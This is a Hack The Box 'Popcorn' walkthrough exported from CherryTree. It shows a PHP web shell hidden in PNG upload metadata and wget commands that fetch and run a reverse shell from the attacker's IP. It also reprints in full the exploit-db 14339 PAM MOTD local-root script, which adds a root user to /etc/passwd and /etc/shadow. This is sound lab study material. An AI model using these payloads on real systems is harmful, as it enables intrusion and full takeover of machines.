<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>popcorn</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="HacktheBox--Linux_Boxes.html">Linux Boxes</a></p>
<p><a href="#popcorn">popcorn</a></p>
<ol>
<li><a href="#nmap">nmap</a></li>
<li><a href="#http">http</a></li>
<ol>
<li><a href="#dirbuster">dirbuster</a></li>
<ol>
<li><a href="#/test">/test</a></li>
<li><a href="#/torrent">/torrent</a></li>
<ol>
<li><a href="#register">register</a></li>
</ol>
</ol>
</ol>
<li><a href="#foothold ">foothold </a></li>
<ol>
<li><a href="#upload save directory">upload save directory</a></li>
<li><a href="#upload noss.png ">upload noss.png </a></li>
<ol>
<li><a href="#kali torrent dl and upload (fail)">kali torrent dl and upload (fail)</a></li>
<li><a href="#test.torrent (fail)">test.torrent (fail)</a></li>
<li><a href="#torrent file (success)">torrent file (success)</a></li>
<ol>
<li><a href="#edit this torrent/change screenshot">edit this torrent/change screenshot</a></li>
<li><a href="#Repeater simple php code injection">Repeater simple php code injection</a></li>
<ol>
<li><a href="#wget tcp_pty_handler">wget tcp_pty_handler</a></li>
<li><a href="#reverse shell">reverse shell</a></li>
</ol>
</ol>
</ol>
</ol>
<li><a href="#Privesc">Privesc</a></li>
<ol>
<li><a href="#lse.sh">lse.sh</a></li>
<li><a href="#MotD Privesc">MotD Privesc</a></li>
<ol>
<li><a href="#14339.sh">14339.sh</a></li>
<li><a href="#14339.sh raw code">14339.sh raw code</a></li>
</ol>
<li><a href="#root">root</a></li>
</ol></ol></div>
<div class="page" id="popcorn"><h1><b><u>popcorn</u></b></h1><img alt="images/10-1.png" src="images/10-1.png"/><br/><img alt="images/10-2.png" src="images/10-2.png"/></div>
<div class="page" id="nmap"><h1><b><u>nmap</u></b></h1><span style="color:#ffa500;">nmap -sV -sC -oA nmap 10.10.10.6</span><br/><img alt="images/11-1.png" src="images/11-1.png"/></div>
<div class="page" id="http"><h1><b><u>http</u></b></h1><img alt="images/1997-1.png" src="images/1997-1.png"/></div>
<div class="page" id="dirbuster"><h1><b><u>dirbuster</u></b></h1><img alt="images/9-1.png" src="images/9-1.png"/></div>
<div class="page" id="/test"><h1><b><u>/test</u></b></h1><span style="color:#24ff00;">some interesting configuration settings can be viewed here but nothing substantial to getting a foothold on the box<br/></span><img alt="images/1998-1.png" src="images/1998-1.png"/><br/><br/><img alt="images/1998-2.png" src="images/1998-2.png"/><br/><img alt="images/1998-3.png" src="images/1998-3.png"/><br/><img alt="images/1998-4.png" src="images/1998-4.png"/><br/></div>
<div class="page" id="/torrent"><h1><b><u>/torrent</u></b></h1><span style="color:#24ff00;">the</span><span style="color:#ffa500;"> /torrent</span><span style="color:#24ff00;"> directory can host torrents and luckily we see theres an “</span><span style="color:#ffff00;">upload</span><span style="color:#24ff00;">” button!</span><br/><br/><img alt="images/1999-1.png" src="images/1999-1.png"/><br/><br/><img alt="images/1999-2.png" src="images/1999-2.png"/></div>
<div class="page" id="register"><h1><b><u>register</u></b></h1><span style="color:#24ff00;">lets sign up in order to use to torrent server's upload capabililties</span><br/><span style="color:#24ff00;">(if the site requires email verification we can make a </span><span style="color:#ffff00;">sharklasers</span><span style="color:#24ff00;"> temporary account if it comes to that)</span><br/><br/><img alt="images/2002-1.png" src="images/2002-1.png"/><br/><img alt="images/2002-2.png" src="images/2002-2.png"/><br/><br/><br/><br/></div>
<div class="page" id="foothold "><h1><b><u>foothold </u></b></h1><img alt="images/2000-1.png" src="images/2000-1.png"/><br/></div>
<div class="page" id="upload save directory"><h1><b><u>upload save directory</u></b></h1><span style="color:#24ff00;">in the</span><span style="color:#ffa500;"> /torrent/upload</span><span style="color:#24ff00;"> directory is where the upload pictures files are stored:</span><br/><img alt="images/2003-1.png" src="images/2003-1.png"/><br/><br/><img alt="images/2003-2.png" src="images/2003-2.png"/><br/><br/><span style="color:#24ff00;">save one of the </span><span style="color:#ffa500;">.png</span><span style="color:#24ff00;"> files to our directory</span><br/><img alt="images/2003-3.png" src="images/2003-3.png"/><br/></div>
<div class="page" id="upload noss.png "><h1><b><u>upload noss.png </u></b></h1><span style="color:#24ff00;">first, lets fire up burp suite and test out popcorn's upload feature</span><br/><img alt="images/2004-1.png" src="images/2004-1.png"/><br/><br/><img alt="images/2004-2.png" src="images/2004-2.png"/><br/><img alt="images/2004-3.png" src="images/2004-3.png"/><br/><span style="color:#24ff00;">we need to upload a torrent file, lets download the torrent file that admin hosted and reupload that, from there we should be able to upload a picture we can attach to our torrent upload<br/></span><br/><br/><br/><br/><br/></div>
<div class="page" id="kali torrent dl and upload (fail)"><h1><b><u>kali torrent dl and upload (fail)</u></b></h1><img alt="images/2005-1.png" src="images/2005-1.png"/><br/><br/><img alt="images/2005-2.png" src="images/2005-2.png"/><br/><br/><img alt="images/2005-3.png" src="images/2005-3.png"/><br/><br/><span style="color:#24ff00;">lets copy it from downloads to our working directory:</span><br/><br/><img alt="images/2005-4.png" src="images/2005-4.png"/><br/><br/><span style="color:#24ff00;">and upload it :</span><br/><img alt="images/2005-5.png" src="images/2005-5.png"/><br/><br/><span style="color:#24ff00;">turns out the server doesn't accept duplicate torrent files...</span><br/><img alt="images/2005-6.png" src="images/2005-6.png"/><br/><br/></div>
<div class="page" id="test.torrent (fail)"><h1><b><u>test.torrent (fail)</u></b></h1><span style="color:#24ff00;">lets see if we can simply add the .torrent suffix to a file to trick the server into believing it is a legitamate torrent file, if not we'll just have to find a real one...</span><br/><br/><img alt="images/2006-1.png" src="images/2006-1.png"/><br/><br/><span style="color:#24ff00;">no luck, lets find a torrent file</span><br/><img alt="images/2006-2.png" src="images/2006-2.png"/></div>
<div class="page" id="torrent file (success)"><h1><b><u>torrent file (success)</u></b></h1><span style="color:#24ff00;">finding a legit torrent file from my windows machine</span>,<span style="color:#24ff00;"> you can find yourself a legitimate torrent online or check out ippsec's popcorn video </span><a href="https://www.youtube.com/watch?v=NMGsnPSm8iw">https://www.youtube.com/watch?v=NMGsnPSm8iw</a><span style="color:#24ff00;"> for suggestions</span> <br/><br/><img alt="images/2007-1.png" src="images/2007-1.png"/><br/><br/><br/><img alt="images/2007-2.png" src="images/2007-2.png"/><br/><br/><img alt="images/2007-3.png" src="images/2007-3.png"/><br/><br/><br/><span style="color:#24ff00;">success!</span><br/><img alt="images/2007-4.png" src="images/2007-4.png"/><br/><br/><span style="color:#24ff00;">finally! now the trick here is to check out the edit this torrent link</span></div>
<div class="page" id="edit this torrent/change screenshot"><h1><b><u>edit this torrent/change screenshot</u></b></h1><span style="color:#24ff00;">we get a popup with a similar format to our torrent file uploader but this allows picture files</span><br/><img alt="images/2008-1.png" src="images/2008-1.png"/><br/><br/><span style="color:#24ff00;">lets intercept the upload in burp suite:</span><br/><br/><img alt="images/2008-2.png" src="images/2008-2.png"/><br/><br/><span style="color:#24ff00;">now send this to repeater with the </span><span style="color:#ffa500;">ctrl+r </span><span style="color:#24ff00;">keybind, and you'll be able to manipulate the upload packet you just sent to the server:</span><br/><br/><br/><br/></div>
<div class="page" id="Repeater simple php code injection"><h1><b><u>Repeater simple php code injection</u></b></h1><span style="color:#24ff00;">now we're going to take advantage of the server's poor file suffix sanitation check and upload a cmd.php and simply append a php command execution script at the very end of our .png magic byte sequence in order to trick the server into uploading our file to its </span><span style="color:#ffa500;">/upload </span><span style="color:#24ff00;">directory</span><br/><span style="color:#24ff00;">in repeater we tweak 2 things: our </span><span style="color:#ffff00;">filename</span><span style="color:#24ff00;"> </span><img alt="images/12-1.png" src="images/12-1.png"/><br/><br/>and our picture metadata to add <span style="color:#ffa500;">&lt;?php echo system($_REQUEST[st0ve]); ?&gt;</span><span style="color:#24ff00;"> to allow Remote code execution once we visit the uploaded file</span><br/><img alt="images/12-2.png" src="images/12-2.png"/><br/><img alt="images/12-3.png" src="images/12-3.png"/><br/><br/><span style="color:#24ff00;">since the uploader doesn't check for file suffixes we can use what're known as ‘magic bytes’ which are the first line or two of special characters linux uses to decipher file types</span><br/><img alt="images/12-4.png" src="images/12-4.png"/><br/><br/><span style="color:#24ff00;">navigating to our .php file and setting our st0ve parameter to whoami yields:</span><br/><img alt="images/12-5.png" src="images/12-5.png"/><br/><span style="color:#24ff00;">command execution!</span><br/><img alt="images/12-6.png" src="images/12-6.png"/><br/><br/>intercepting the web request on burp suite is a little easier to work with:<br/><img alt="images/12-7.png" src="images/12-7.png"/><br/><br/><img alt="images/12-8.png" src="images/12-8.png"/><br/></div>
<div class="page" id="wget tcp_pty_handler"><h1><b><u>wget tcp_pty_handler</u></b></h1><span style="color:#24ff00;">lets set our cmd ‘st0ve’ as a wget grabbing our tcp shell script and name it rev.py:</span><br/><br/>but first lets spin up our http server:<br/><img alt="images/2009-1.png" src="images/2009-1.png"/><br/><br/><br/><span style="color:#ffa500;">st0ve=wget 10.10.14.62/tcp_pty_backconnect.py -O /dev/shm/rev.py</span><br/><img alt="images/2009-2.png" src="images/2009-2.png"/><br/><img alt="images/2009-3.png" src="images/2009-3.png"/><br/><br/><br/><span style="color:#24ff00;">we can check the file by using cat</span><span style="color:#ffa500;"> /dev/shm/.rev.py</span><br/><img alt="images/2009-4.png" src="images/2009-4.png"/><br/><img alt="images/2009-5.png" src="images/2009-5.png"/><br/><br/><br/><br/></div>
<div class="page" id="reverse shell"><h1><b><u>reverse shell</u></b></h1><span style="color:#24ff00;">to run:  </span><span style="color:#ffa500;">st0ve=python /dev/shm/rev.py</span><br/><img alt="images/13-1.png" src="images/13-1.png"/><br/><br/>connect back: <span style="color:#ffa500;">sudo python tcp_pty_shell_handler.py -b 10.10.14.62:31337</span><br/><img alt="images/13-2.png" src="images/13-2.png"/><br/><span style="color:#24ff00;">and we have our foothold!</span></div>
<div class="page" id="Privesc"><h1><b><u>Privesc</u></b></h1><span style="color:#24ff00;">lets snoop around both the </span><span style="color:#ffff00;">/var/www </span><span style="color:#24ff00;">directory or the /home directory since neither of those directories have files in them that are baseline/normal for a linux box to have without a user putting them there to begin with</span><br/><br/><img alt="images/325-1.png" src="images/325-1.png"/><br/><br/><br/><br/><img alt="images/325-2.png" src="images/325-2.png"/><br/><br/><span style="color:#24ff00;">after doing some digging on potential exploits on these files, </span><img alt="images/325-3.png" src="images/325-3.png"/> sticks out</div>
<div class="page" id="lse.sh"><h1><b><u>lse.sh</u></b></h1><span style="color:#24ff00;">lse.sh or linux smart enumeration bash script is a personal favorite of mine when it comes to enumerating potential privilege escalation vulnerabilites in linux boxes, lets see what it reports back to us about this box</span>, <br/><br/>I'll list everything that is interesting but will eventually follow ippsec's priv esc method in the next node<br/><br/><span style="color:#24ff00;">we can check our own box against this one to find SUID binaries that are irregular on this box and search them up on GTFO bins to see if theres a way to take advantage of them to privesc</span><br/><img alt="images/2001-1.png" src="images/2001-1.png"/><br/><br/><br/><span style="color:#24ff00;">according to this find there are ways to hijack executable paths that can potentiall call reverse shells back to our attack machine</span><br/><img alt="images/2001-2.png" src="images/2001-2.png"/><br/><br/><span style="color:#24ff00;">we can also read a couple files that www-data does not own</span> <img alt="images/2001-3.png" src="images/2001-3.png"/> <span style="color:#24ff00;">comes to mind which may show past commands other users have typed in that may allow us to steal and use to priv esc</span><br/><img alt="images/2001-4.png" src="images/2001-4.png"/><br/></div>
<div class="page" id="MotD Privesc"><h1><b><u>MotD Privesc</u></b></h1><img alt="images/14-1.png" src="images/14-1.png"/><br/><br/><img alt="images/14-2.png" src="images/14-2.png"/><br/><img alt="images/14-3.png" src="images/14-3.png"/><br/><br/><span style="color:#24ff00;">something fails here</span><br/><img alt="images/14-4.png" src="images/14-4.png"/><br/><br/><span style="color:#24ff00;">but if we copy over the raw code from exploitdb at</span> <a href="https://www.exploit-db.com/raw/14339">https://www.exploit-db.com/raw/14339</a> <span style="color:#24ff00;">to a file, it works fine</span><br/><img alt="images/14-5.png" src="images/14-5.png"/><br/><br/></div>
<div class="page" id="14339.sh"><h1><b><u>14339.sh</u></b></h1><img alt="images/2010-1.png" src="images/2010-1.png"/><br/><br/><span style="color:#24ff00;">here's a copy of the exploit source for reference:</span><br/><img alt="images/2010-2.png" src="images/2010-2.png"/><br/><img alt="images/2010-3.png" src="images/2010-3.png"/><br/><img alt="images/2010-4.png" src="images/2010-4.png"/></div>
<div class="page" id="14339.sh raw code"><h1><b><u>14339.sh raw code</u></b></h1><img alt="images/2011-1.png" src="images/2011-1.png"/><br/><br/><div class = "codebox"><div style="background-color: #001b33 ; padding: 10px; border: 1px solid green;">#!/bin/bash<br/>#<br/># Exploit Title: Ubuntu PAM MOTD local root<br/># Date: July 9, 2010<br/># Author: Anonymous<br/># Software Link: <a href="http://packages.ubuntu.com/">http://packages.ubuntu.com/</a><br/># Version: pam-1.1.0<br/># Tested on: Ubuntu 9.10 (Karmic Koala), Ubuntu 10.04 LTS (Lucid Lynx)<br/># CVE: CVE-2010-0832<br/># Patch Instructions: sudo aptitude -y update; sudo aptitude -y install libpam~n~i<br/># References: <a href="http://www.exploit-db.com/exploits/14273/">http://www.exploit-db.com/exploits/14273/</a> by Kristian Erik Hermansen<br/>#<br/># Local root by adding temporary user toor:toor with id 0 to /etc/passwd &amp; /etc/shadow.<br/># Does not prompt for login by creating temporary SSH key and authorized_keys entry.<br/>#<br/>#   user@ubuntu:~$ bash ubuntu-pam-motd-localroot.sh<br/>#   [*] Ubuntu PAM MOTD local root<br/>#   [*] Backuped /home/user/.ssh/authorized_keys<br/>#   [*] SSH key set up<br/>#   [*] Backuped /home/user/.cache<br/>#   [*] spawn ssh<br/>#   [+] owned: /etc/passwd<br/>#   [*] spawn ssh<br/>#   [+] owned: /etc/shadow<br/>#   [*] Restored /home/user/.cache<br/>#   [*] Restored /home/user/.ssh/authorized_keys<br/>#   [*] SSH key removed<br/>#   [+] Success! Use password toor to get root<br/>#   Password:<br/>#   root@ubuntu:/home/user# id<br/>#   uid=0(root) gid=0(root) groupes=0(root)<br/>#<br/>P='toor:x:0:0:root:/root:/bin/bash'<br/>S='toor:$6$tPuRrLW7$m0BvNoYS9FEF9/Lzv6PQospujOKt0giv.7JNGrCbWC1XdhmlbnTWLKyzHz.VZwCcEcYQU5q2DLX.cI7NQtsNz1:14798:0:99999:7:::'<br/>echo "[*] Ubuntu PAM MOTD local root"<br/>[ -z "$(which ssh)" ] &amp;&amp; echo "[-] ssh is a requirement" &amp;&amp; exit 1<br/>[ -z "$(which ssh-keygen)" ] &amp;&amp; echo "[-] ssh-keygen is a requirement" &amp;&amp; exit 1<br/>[ -z "$(ps -u root |grep sshd)" ] &amp;&amp; echo "[-] a running sshd is a requirement" &amp;&amp; exit 1<br/>backup() {<br/>    [ -e "$1" ] &amp;&amp; [ -e "$1".bak ] &amp;&amp; rm -rf "$1".bak<br/>    [ -e "$1" ] || return 0<br/>    mv "$1"{,.bak} || return 1<br/>    echo "[*] Backuped $1"<br/>}<br/>restore() {<br/>    [ -e "$1" ] &amp;&amp; rm -rf "$1"<br/>    [ -e "$1".bak ] || return 0<br/>    mv "$1"{.bak,} || return 1<br/>    echo "[*] Restored $1"<br/>}<br/>key_create() {<br/>    backup ~/.ssh/authorized_keys<br/>    ssh-keygen -q -t rsa -N '' -C 'pam' -f "$KEY" || return 1<br/>    [ ! -d ~/.ssh ] &amp;&amp; { mkdir ~/.ssh || return 1; }<br/>    mv "$KEY.pub" ~/.ssh/authorized_keys || return 1<br/>    echo "[*] SSH key set up"<br/>}<br/>key_remove() {<br/>    rm -f "$KEY"<br/>    restore ~/.ssh/authorized_keys<br/>    echo "[*] SSH key removed"<br/>}<br/>own() {<br/>    [ -e ~/.cache ] &amp;&amp; rm -rf ~/.cache<br/>    ln -s "$1" ~/.cache || return 1<br/>    echo "[*] spawn ssh"<br/>    ssh -o 'NoHostAuthenticationForLocalhost yes' -i "$KEY" localhost true<br/>    [ -w "$1" ] || { echo "[-] Own $1 failed"; restore ~/.cache; bye; }<br/>    echo "[+] owned: $1"<br/>}<br/>bye() {<br/>    key_remove<br/>    exit 1<br/>}<br/>KEY="$(mktemp -u)"<br/>key_create || { echo "[-] Failed to setup SSH key"; exit 1; }<br/>backup ~/.cache || { echo "[-] Failed to backup ~/.cache"; bye; }<br/>own /etc/passwd &amp;&amp; echo "$P" &gt;&gt; /etc/passwd<br/>own /etc/shadow &amp;&amp; echo "$S" &gt;&gt; /etc/shadow<br/>restore ~/.cache || { echo "[-] Failed to restore ~/.cache"; bye; }<br/>key_remove<br/>echo "[+] Success! Use password toor to get root"<br/>su -c "sed -i '/toor:/d' /etc/{passwd,shadow}; chown root: /etc/{passwd,shadow}; \<br/>  chgrp shadow /etc/shadow; nscd -i passwd &gt;/dev/null 2&gt;&amp;1; bash" toor</div></div></div>
<div class="page" id="root"><h1><b><u>root</u></b></h1><span style="color:#24ff00;">run a quick wget command to download our </span><span style="color:#ffff00;">MOTD</span><span style="color:#24ff00;"> exploit onto our victim box</span><br/><br/><img alt="images/326-1.png" src="images/326-1.png"/><br/><br/><br/><img alt="images/326-2.png" src="images/326-2.png"/><br/><br/><span style="color:#24ff00;">and we're root!</span><br/><img alt="images/326-3.png" src="images/326-3.png"/></div>

</div>